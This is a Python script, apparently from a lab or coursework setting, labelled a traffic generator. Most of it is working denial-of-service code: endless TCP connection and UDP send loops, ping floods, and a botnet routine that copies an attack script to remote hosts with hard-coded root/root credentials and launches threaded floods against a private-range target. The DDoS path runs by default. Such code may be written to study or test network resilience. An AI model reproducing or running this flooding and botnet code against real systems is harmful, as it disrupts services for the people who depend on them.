# Traffic Generator
from Inputs import get_inputs
import Botnet
import getpass, socket, time, subprocess, threading, sys

# generate regular traffic and requests
def generate_traffic(host, transmission, port, buffer_size, message):
    if transmission == "TCP":
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((host, port))
        if port == 80:
            conn.sendall(b"GET / HTTP/1.1\r\n\r\n")
            data = conn.recv(buffer_size)
            data = data.decode()
            data = data.rstrip()
        else:
            data = conn.recv(buffer_size)
            data = data.decode()
            data = data.rstrip()
    elif transmission == "UDP":
        conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        conn.connect((host, port))
        data = conn.sendto(message.encode(), (host, port))

    return(data)

# attempt denial of service on host
def dos(host, transmission, port, buffer_size, message):
    print("Denial of service attempt.")
    # do ping requests for ICMP
    if transmission == "ICMP":
        data = ""
        ping_request = "ping {}".format(host)
        for k in range(0,5):
            req = subprocess.Popen(ping_request, stdout=subprocess.PIPE, shell=False)
            stdout = req.communicate()
            #time.sleep(delay)
            print(stdout)
        
    # attempt to cause overload for other TCP/UDP ports
    elif transmission == "TCP":
        while True:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((host, port))

            data = conn.recv(buffer_size)
            data = data.decode()
            data = data.rstrip()

            #time.sleep(delay)

            conn.close()

    elif transmission == "UDP":
        while True:
            conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            conn.connect((host, port))
            conn.sendto(message.encode(), (host, port))
    return(data)

# attempt distributed denial of service on host with multiple bots (botnet) and localhost
def ddos(bot, username, password, script, host, transmission, port, buffer_size, att_msg):
    Botnet.generate_dos(bot, username, password, script)
    return()

username = getpass.getuser()
filename = "C:\\Users\\{}\\eclipse-workspace\\traffic-gen\\inputs.txt".format(username)

inputs = get_inputs(filename)

transmission = inputs['Transmission']
port = int(inputs['Port'])
buffer_size = inputs['PacketSize']

# apply byte conversion if required
if "Kb" in buffer_size:
    buffer_size = buffer_size.replace("Kb", "")
    buffer_size = int(buffer_size) * 1024
elif "B" in buffer_size:
    buffer_size = int(buffer_size.replace("B", ""))

host = "192.168.3.130"
#host = "192.168.126.128"
bot1 = "192.168.3.131"
bot2 = host
#bot = "192.168.126.129"
username = "root"
password = "root"
message = "Hello"
att_msg = "Denial Of Service"

botnet = { bot1: [username, password], bot2: [username, password] }

print("Target: {}, Protocol: {}, Port: {}, Buffer Size: {} bytes. \n".format(host, transmission, str(port), str(buffer_size)))

#output = generate_traffic(host, transmission, port, buffer_size, message)
delay = 0.1

#output = dos(host, transmission, port, buffer_size, att_msg)
DDOS = True
if DDOS:
    print("PREPARING BOTNET...")
    # generate bot_dos.py
    script = Botnet.create_bot_dos_script(host, att_msg, port, transmission, buffer_size)
    # transfer the script to each bot
    for bot, bot_credentials in botnet.items():
        username = bot_credentials[0]
        password = bot_credentials[1]
        Botnet.transfer_script(bot, username, password, script)
    # run the attack
    print("BOTNET READY")
    for bot, bot_credentials in botnet.items():
        username = bot_credentials[0]
        password = bot_credentials[1]
        _thread = threading.Thread(target=ddos, args=((bot, username, password, script, host, transmission, port, buffer_size, att_msg)))
        _thread.start()
        print("{} is attacking {}.".format(bot, host))
    #ddos(bot, username, password, script, host, transmission, port, buffer_size, att_msg)
#print('Received: {}'.format(output))

sys.exit(0)